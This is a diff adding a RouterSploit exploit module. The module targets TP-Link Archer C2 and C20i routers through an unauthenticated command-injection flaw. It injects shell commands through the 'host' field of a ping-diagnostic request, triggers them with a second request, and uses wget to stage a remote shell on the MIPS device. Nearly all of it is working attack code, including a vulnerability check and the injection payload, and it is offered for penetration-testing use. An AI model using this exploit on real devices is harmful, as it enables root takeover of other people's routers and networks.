@@ -1,0 +1,100 @@
+import time
+
+from routersploit import (
+    exploits,
+    print_success,
+    print_error,
+    print_status,
+    http_request,
+    mute,
+    validators,
+    shell,
+)
+
+
+class Exploit(exploits.Exploit):
+    """
+    Exploit implementation for TP-Link Archer C2 and Archer C20i remote code execution vulnerability.
+    If the target is vulnerable it allows to execute commands on operating system level with root privileges.
+    """
+    __info__ = {
+        'name': 'TP-Link Archer C2 & C20i',
+        'description': 'Exploits TP-Link Archer C2 and Archer C20i remote code execution vulnerability that allows executing commands on operating system level with root privileges.',
+        'authors': [
+            'Michal Sajdak <michal.sajdak[at]securitum.pl',  # vulnerability discovery
+            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
+        ],
+        'references': [
+            'http://sekurak.pl/tp-link-root-bez-uwierzytelnienia-urzadzenia-archer-c20i-oraz-c2/',  # only in polish
+        ],
+        'devices': [
+            'TP-Link Archer C2',
+            'TP-Link Archer C20i',
+        ],
+    }
+
+    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
+    port = exploits.Option(80, 'Target port')  # default port
+
+    def run(self):
+        if self.check():
+            print_success("Target is vulnerable")
+            print_status("Invoking command shell")
+            print_status("It is blind command injection so response is not available")
+
+            # requires testing
+            shell(self, architecture="mips", method="wget", binary="wget", location="/tmp")
+        else:
+            print_error("Exploit failed - target seems to be not vulnerable")
+
+    def execute(self, cmd):
+        url = "{}:{}/cgi?2".format(self.target, self.port)
+        referer = "{}/mainFrame.htm".format(self.target)
+
+        headers = {"Content-Type": "text/plain",
+                   "Referer": referer}
+
+        data = ("[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6\r\n"
+                "dataBlockSize=64\r\n"
+                "timeout=1\r\n"
+                "numberOfRepetitions=1\r\n"
+                "host=127.0.0.1;" + cmd + ";\r\n"
+                "X_TP_ConnName=ewan_ipoe_s\r\n"
+                "diagnosticsState=Requested\r\n")
+
+        # send command
+        http_request(method="POST", url=url, headers=headers, data=data)
+
+        url = "{}:{}/cgi?7".format(self.target, self.port)
+        data = ("[ACT_OP_IPPING#0,0,0,0,0,0#0,0,0,0,0,0]0,0\r\n")
+
+        # execute command on device
+        http_request(method="POST", url=url, headers=headers, data=data)
+        time.sleep(1)
+
+        return ""
+
+    @mute
+    def check(self):
+        url = "{}:{}/cgi?2".format(self.target, self.port)
+        referer = "{}/mainFrame.htm".format(self.target)
+
+        headers = {"Content-Type": "text/plain",
+                   "Referer": referer}
+
+        data = ("[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6\r\n"
+                "dataBlockSize=64\r\n"
+                "timeout=1\r\n"
+                "numberOfRepetitions=1\r\n"
+                "host=127.0.0.1\r\n"
+                "X_TP_ConnName=ewan_ipoe_s\r\n"
+                "diagnosticsState=Requested\r\n")
+
+        response = http_request(method="POST", url=url, headers=headers, data=data)
+        if response is None:
+            return False  # target is not vulnerable
+
+        if response.status_code == 200 and "[error]0" in response.text:
+            return True  # target is vulnerable
+
+        return False  # target is not vulnerable
